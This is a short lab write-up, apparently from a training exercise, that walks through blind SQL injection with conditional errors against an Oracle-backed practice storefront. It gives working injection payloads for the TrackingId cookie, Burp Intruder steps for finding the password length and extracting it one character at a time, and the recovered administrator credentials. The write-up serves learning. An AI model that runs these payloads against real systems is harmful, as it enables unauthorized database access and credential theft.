Blind SQL injection with conditional errors


  1. Provided with storefront website, told there is a table called users containing columns username and password, told to find password for user administrator and sign in
  2. Intercepted page refresh on burpsuite and sent to Repeater
  3. Appended ‘||(SELECT ’')||' to cookie TrackingId and received error
  4. Tried ‘|| (SELECT ’' dual) ||' and no error
  5. Discovered database model is Oracle
  6. Appended ‘|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||'
  7. Resulted in no errors
  8. Appended ‘|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||’
  9. Resulted in error as expected
  10. Appended ‘|| (SELECT CASE WHEN (LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = ’administrator')||'
  11. Recieved error meaning password has length longer than 1
  12. Sent to Intruder, set positions around 1, set payload from 1-100, grepped error
  13. Discovered password length is 20 characters:
  1. Appended ‘|| (SELECT CASE WHEN (SUBSTR(password, 1, 1)='1') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username = ’administrator')||'
  2. Set positions around 1, pasted list 0-9 and a-z, grepped for Internal Server Error
  3. Discovered first character of password is 7
  4. Repeated 19 times
  5. Discovered credentials “administrator:7vcpyylj044fafappmjy”
